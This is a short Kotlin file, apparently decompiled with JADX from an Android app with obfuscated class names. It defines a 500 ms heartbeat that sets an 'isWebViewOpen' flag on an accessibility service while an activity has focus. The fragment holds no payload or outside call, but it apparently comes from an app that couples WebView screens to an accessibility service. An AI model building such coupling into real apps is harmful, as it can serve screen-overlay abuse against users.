package com.storm.safe.rock.p000

import android.util.Log
import com.storm.safe.rock.iuzxujjtqev
import com.storm.safe.rock.service.MyAccessibilityService

// JADX: p000/hk1.java (57 LOC)
class WebViewHeartbeat(private val activity: iuzxujjtqev) : Runnable {

    override fun run() {
        if (!activity.isInitialized || activity.isFinishing || activity.isDestroyed) return
        var isActive = false
        try {
            if (activity.hasWindowFocus() && !activity.isFinishing && !activity.isDestroyed) {
                isActive = true
            }
        } catch (_: Exception) {}
        if (isActive) {
            try {
                MyAccessibilityService.isWebViewOpen = true
            } catch (e: Exception) {
                Log.e("iuzxujjtqev", "❌ 更新WebView状态失败", e)
                activity.uiHandler?.postDelayed(this, 500L)
                return
            }
        }
        activity.uiHandler?.postDelayed(this, 500L)
    }
}
